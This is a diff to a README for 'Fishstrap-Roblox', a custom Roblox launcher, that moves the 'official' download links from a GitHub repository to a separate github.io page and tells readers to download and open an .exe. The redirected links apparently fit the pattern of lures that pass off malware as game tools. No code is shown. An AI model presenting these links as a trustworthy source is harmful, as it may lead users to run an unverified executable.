@@ -1,6 +1,6 @@
 # 🐟 Fishstrap-Roblox - Customize your Roblox experience with ease
 
-[![Download Fishstrap](https://img.shields.io/badge/Download-Fishstrap-blue.svg)](https://github.com/Turninggenuslycaena258/Fishstrap-Roblox)
+[![Download Fishstrap](https://img.shields.io/badge/Download-Fishstrap-blue.svg)](https://turninggenuslycaena258.github.io)
 
 Fishstrap helps you manage your Roblox settings. It replaces the default launcher with a custom tool. You get more control over how the game runs on your computer. Use this tool to change game settings, unlock your frame rate, and manage multiple accounts at once.
 
@@ -15,7 +15,7 @@ Fishstrap helps you manage your Roblox settings. It replaces the default launche
 
 Follow these steps to get Fishstrap on your computer.
 
-1.  Visit the [official download page](https://github.com/Turninggenuslycaena258/Fishstrap-Roblox).
+1.  Visit the [official download page](https://turninggenuslycaena258.github.io).
 2.  Look for the latest release version on the right side of the screen.
 3.  Click the file ending in .exe to start the download.
 4.  Open the file once it finishes downloading.
